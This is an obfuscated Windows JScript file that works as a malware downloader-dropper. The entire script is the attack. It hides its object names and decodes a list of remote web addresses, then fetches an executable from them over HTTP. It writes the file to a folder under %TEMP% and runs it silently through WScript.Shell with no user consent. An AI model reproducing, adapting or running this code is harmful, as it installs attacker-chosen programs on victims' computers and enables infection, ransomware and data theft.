
function sMrEORIPt(KMzDPGJycpH) {
var xhQldbdx = "IZoO Ws qtWvaox cri pt.S aIsUxU hell".split(" ");
var SCGQPrjT = WScript.CreateObject(xhQldbdx[1] + xhQldbdx[3] + xhQldbdx[4] + xhQldbdx[6]);
SCGQPrjT.Run(KMzDPGJycpH, 0x1, 0x0);
}
function FkalmetXQ(ebkxK,Kaabj,IWcnG,VkxZ) {
var oRxcG = "fscIcT dlL pt.Shell JURYguQ Scri  %TE MP% \\".split(" ");
var qLk=((1)?"W" + oRxcG[4]:"")+oRxcG[2];
var nx = WScript.CreateObject(qLk);
return nx.ExpandEnvironmentStrings(oRxcG[6]+oRxcG[7]+oRxcG[8]);
}
function idDJcxBY() {
var wsSLdHy = "Sc ukUKyOY r NEiRgXUcv ipting RIFSaen TSD ile HDwmaLmKCbbUNd System sq RfmrX Obj GKKZhu ect LGdgRCj".split(" ");
return wsSLdHy[0] + wsSLdHy[2] + wsSLdHy[4] + ".F" + wsSLdHy[7] + wsSLdHy[9] + wsSLdHy[12] + wsSLdHy[14];
}
function ZFIq(QqlNu) {
txCJKPj = WScript.CreateObject(QqlNu);
return txCJKPj
}
function UPAW(dVFlK,BhOJo) {
dVFlK.write(BhOJo);
}
function RcjR(vgHJB) {
vgHJB.open();
}
function uCzF(DYRWs,PlGTM) {
DYRWs.saveToFile(PlGTM,104-102);
}
function ZlFB(VIhPz,aAgpV,BqMkF) {
VIhPz.open(BqMkF,aAgpV,false);
}
function VtwL(DaXUB) {
if (DaXUB == 800-600){return true;} else {return false;}
}
function sjWQ(GLJqt) {
if (GLJqt > 164295-735){return true;} else {return false;}
}
function dFtZ(sbaLj) {
var GKhBR="";
r=(535-535);
while(true) {
if (r >= sbaLj.length) {break;}
if (r % (677-675) != (956-956)) {
GKhBR += sbaLj.substring(r, r+(101-100));
}
r++;
}
return GKhBR;
}
function ImrJ(WaGTZ) {
var ZVePtSeh=["\x73\x65\x6E\x64"];
WaGTZ[ZVePtSeh[0]]();
}
function UMYr(ERpZP) {
return ERpZP.status;
}
function ZvkOx(XjQjoW) {
return new ActiveXObject(XjQjoW);
}
function EnBVKsh(LiSD) {
return LiSD.responseBody;
}
function UVpMlTDw(ddW) {
return ddW.size;
}
var rQ="GgcrueLekt5iZnagns3jEaKmBaWjHcZavfCf9.5cvorm4/j8Q05RFUcsRH8?G Uhredl8l5oOm2i3sltueSrxb9iYzun8e7svqJq3.vcwoamQ/a8Z07RpUbs0Hk?w 0?Z j?b f?";
var cX = dFtZ(rQ).split(" ");
var lxgmqG = ". fgYshf e nWEbPQvg xe RUsH".split(" ");
var S = [cX[0].replace(new RegExp(lxgmqG[5],'g'), lxgmqG[0]+lxgmqG[2]+lxgmqG[4]),cX[1].replace(new RegExp(lxgmqG[5],'g'), lxgmqG[0]+lxgmqG[2]+lxgmqG[4]),cX[2].replace(new RegExp(lxgmqG[5],'g'), lxgmqG[0]+lxgmqG[2]+lxgmqG[4]),cX[3].replace(new RegExp(lxgmqG[5],'g'), lxgmqG[0]+lxgmqG[2]+lxgmqG[4]),cX[4].replace(new RegExp(lxgmqG[5],'g'), lxgmqG[0]+lxgmqG[2]+lxgmqG[4])];
var fYB = FkalmetXQ("sJOC","vHSDW","Fkdwug","ZXNqXXl");
var MnZ = ZvkOx(idDJcxBY());
var RRJRdn = ("Qdlbjru \\").split(" ");
var mqMS = fYB+RRJRdn[0]+RRJRdn[1];
try{
MnZ.CreateFolder(mqMS);
}catch(DbYhmO){
};
var XXU = ("2.XMLHTTP ilvzEdJ lneyu XML ream St EPHUuIqi AD cdJvxlL O elVL D").split(" ");
var jZ = true  , makf = XXU[7] + XXU[9] + XXU[11];
var xu = ZFIq("MS"+XXU[3]+(960629, XXU[0]));
var FzG = ZFIq(makf + "B." + XXU[5]+(551680, XXU[4]));
var ZNt = 0;
var y = 1;
var wURdNvc = 286705;
var T=ZNt;
while (true)  {
if(T>=S.length) {break;}
var yo = 0;
var pCg = ("ht" + " TrAUNEe tp FvUda EjtnuBxk :// FzWJGrI .e xe G ET").split(" ");
try  {
var CjqUn=pCg[964-964]+pCg[159-157]+pCg[567-562];
ZlFB(xu,CjqUn+S[T]+y, pCg[9]+pCg[10]); ImrJ(xu); if (VtwL(UMYr(xu)))  {      
RcjR(FzG); FzG.type = 1; UPAW(FzG,EnBVKsh(xu)); if (sjWQ(UVpMlTDw(FzG)))  {
yo = 1;FzG.position=0;uCzF(FzG,/*hVnp48hhjN*/mqMS/*5dcS5992CY*/+wURdNvc+pCg[7]+pCg[8]); try  {
if (((new Date())>0,7785179888)) {
sMrEORIPt(mqMS+wURdNvc+/*XbC914wN3W*/pCg[7]+pCg[8]/*ggGQ85qNJV*/); 
break;
}
}
catch (lf)  {
}; 
}; FzG.close(); 
}; 
if (yo == 1)  {
ZNt = T; break; 
}; 
}
catch (lf)  { 
}; 
T++;
}; 

